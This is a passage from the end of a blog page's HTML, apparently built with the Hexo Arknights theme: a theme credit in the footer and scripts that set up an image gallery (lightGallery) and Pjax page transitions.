href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>